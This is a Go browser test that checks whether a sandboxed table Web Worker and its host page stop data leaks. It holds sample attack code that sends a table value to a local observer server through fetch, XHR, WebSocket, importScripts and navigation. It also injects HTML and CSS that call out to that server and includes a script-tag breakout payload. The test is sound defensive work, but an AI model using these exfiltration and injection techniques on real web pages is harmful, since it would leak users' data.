package web

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/z-chenhao/assistant/internal/agent"
	"github.com/z-chenhao/assistant/internal/delivery/ui"
)

type tableWorkerCore struct {
	identityCore
	views map[string]ui.TableView
}

func (c tableWorkerCore) WebTableView(_ context.Context, ref string) (ui.TableView, error) {
	v, ok := c.views[ref]
	if !ok {
		return ui.TableView{}, agent.ErrNotFound
	}
	return v, nil
}

// Actual protected HTTP/CSP, fixed Host DOM driver and owning Worker. Accepted
// output/domain grants are fixtures, not a full managed App/SQLite proof.
func TestUITableWorkerBrowserIsolationAndBoundedProjection(t *testing.T) {
	if os.Getenv("STEWARD_TEST_APP_BROWSER") != "1" {
		t.Skip("run by make test-browser")
	}
	read := func(path string) []byte {
		t.Helper()
		data, err := os.ReadFile(path)
		if err != nil {
			t.Fatal(err)
		}
		return data
	}
	var original struct {
		Props  json.RawMessage `json:"props"`
		Stages []struct {
			Name string `json:"name"`
			HTML string `json:"html"`
		} `json:"stages"`
	}
	if err := json.Unmarshal(read("../../plugin/intelligentui/testdata/original-table.json"), &original); err != nil {
		t.Fatal(err)
	}
	initial := original.Stages[0].HTML
	icon := ""
	for _, stage := range original.Stages {
		if stage.Name == "amount-ascending" {
			icon = regexp.MustCompile(`<svg[^>]*>[\s\S]*?</svg>`).FindString(stage.HTML)
		}
	}
	if icon == "" {
		t.Fatal("independent original sort icon missing")
	}
	initial = strings.Replace(initial, "<section ", `<section data-table-facts="`+base64.StdEncoding.EncodeToString(original.Props)+`" `, 1)
	end := strings.LastIndex(initial, "</section>")
	initial = initial[:end] + `<template data-table-sort-icon>` + icon + `</template>` + initial[end:]
	var mu sync.Mutex
	var requests []string
	peer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		mu.Lock()
		requests = append(requests, r.URL.RequestURI())
		mu.Unlock()
		w.Header().Set("Access-Control-Allow-Origin", "*")
		_, _ = w.Write([]byte("synthetic destination"))
	}))
	defer peer.Close()
	target, _ := json.Marshal(peer.URL)
	owning := string(read("../../plugin/intelligentui/view/table-worker.js"))
	attack := `"use strict";if(typeof document!=='undefined'||typeof parent!=='undefined')throw Error('candidate unexpectedly has DOM');globalThis.WORKER_ONLY_MARKER='candidate ran';const payload="</script><script>globalThis.DOM_ESCAPE=true</script>";` + owning + `
const originalHandler=onmessage;onmessage=event=>{if(event.data.type==='init'){const url=` + string(target) + `+'/synthetic?value='+encodeURIComponent(event.data.facts.rows[0][0]);try{location.replace(url)}catch{}try{location.href=url}catch{}try{fetch(url).catch(()=>{})}catch{}try{importScripts(url)}catch{}try{const req=new XMLHttpRequest();req.open('GET',url);req.send()}catch{}try{const ws=new WebSocket(url.replace('http:','ws:'));ws.onerror=()=>{}}catch{}try{indexedDB.open('synthetic-worker-storage');throw Error('opaque worker gained storage')}catch(error){if(error.name!=='SecurityError')throw error}}originalHandler(event)};`
	view := ui.TableView{HTML: initial, CSS: string(read("../../plugin/intelligentui/view/table.css")), Worker: attack, Styles: read("assets/widget.css"), CompactMaxWidth: 760}
	// Malicious markup and CSS must not bypass the non-DOM Worker boundary.
	view.HTML += `<meta http-equiv="refresh" content="0;url=` + peer.URL + `/meta"><img src="` + peer.URL + `/image"><svg><image href="` + peer.URL + `/svg"></image></svg><script>location.replace('` + peer.URL + `/dom')</script>`
	view.CSS += `.answer-table{background-image:url('` + peer.URL + `/css')}`
	views := map[string]ui.TableView{"ui:original#1": view}
	for name, code := range map[string]string{
		"invalid":     `onmessage=event=>postMessage({seq:event.data.seq,type:'ready',projection:{sort:-1,direction:1,rows:[999999],numeric:[],selected:[],pressed:[],selectionActive:false,regionLabel:'bad',emptyMessage:'bad'}})`,
		"unsolicited": strings.Replace(owning, "reply('ready',seq);return;", "reply('ready',seq);postMessage({type:'export-rows',seq:999999,rows:[0]});return;", 1),
		"loop":        `onmessage=()=>{while(true){}}`,
	} {
		copy := view
		copy.Worker = code
		views["ui:"+name+"#1"] = copy
	}
	core := tableWorkerCore{views: views}
	s := &Server{Core: core, Config: Config{TokenRef: "credential:test"}, Secrets: fakeSecrets{}}
	host := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/fixture" {
			ref := r.URL.Query().Get("ref")
			if _, ok := views[ref]; !ok {
				http.NotFound(w, r)
				return
			}
			_, _ = w.Write([]byte(`<!doctype html><link rel="stylesheet" href="/style.css"><iframe sandbox="allow-scripts" style="width:800px;height:600px;border:0" id="table"></iframe><script>window.messages=[];const frame=document.getElementById('table');addEventListener('message',event=>{if(event.source!==frame.contentWindow||event.origin!=='null'||event.data?.channel!=='steward-table-view')return;messages.push(event.data);if(event.data.type==='ready'){const style=getComputedStyle(document.documentElement),tokens={};for(const key of ['--card','--border','--foreground','--muted-foreground','--hover','--font-ui','--control-border'])tokens[key]=style.getPropertyValue(key).trim();frame.contentWindow.postMessage({channel:'steward-table-view',type:'theme',theme:'light',locale:Intl.Collator().resolvedOptions().locale,language:'en',viewportWidth:innerWidth,tokens},'*');frame.contentWindow.postMessage({channel:'steward-table-view',type:'restore',state:{},query:'',selected:''},'*')}});frame.src='/ui/table?ref='+encodeURIComponent(` + mustTableJSString(t, ref) + `);</script>`))
			return
		}
		s.ServeHTTP(w, r)
	}))
	defer host.Close()
	evidence := t.TempDir()
	if path := os.Getenv("STEWARD_APP_BROWSER_EVIDENCE"); path != "" {
		evidence = filepath.Join(path, "table-worker")
	}
	ctx, cancel := context.WithTimeout(context.Background(), 50*time.Second)
	defer cancel()
	if out, err := exec.CommandContext(ctx, "node", "../../../guest-browser/table-worker-http.mjs", host.URL, evidence).CombinedOutput(); err != nil {
		t.Fatalf("Table Worker browser: %v\n%s", err, out)
	}
	mu.Lock()
	defer mu.Unlock()
	if len(requests) != 0 {
		t.Fatal("candidate escaped through navigation/network", requests)
	}
	report := struct {
		Scope        string   `json:"scope"`
		Requests     []string `json:"requests"`
		ZeroRequests bool     `json:"zero_requests"`
	}{"actual temporary HTTP observer after candidate navigation/fetch/XHR/importScripts/WebSocket and resource attempts", append([]string{}, requests...), true}
	data, err := json.MarshalIndent(report, "", "  ")
	if err != nil {
		t.Fatal(err)
	}
	if err = os.WriteFile(filepath.Join(evidence, "network-observer.json"), append(data, '\n'), 0600); err != nil {
		t.Fatal(err)
	}
}

func mustTableJSString(t *testing.T, value string) string {
	t.Helper()
	raw, err := json.Marshal(value)
	if err != nil {
		t.Fatal(err)
	}
	return string(raw)
}
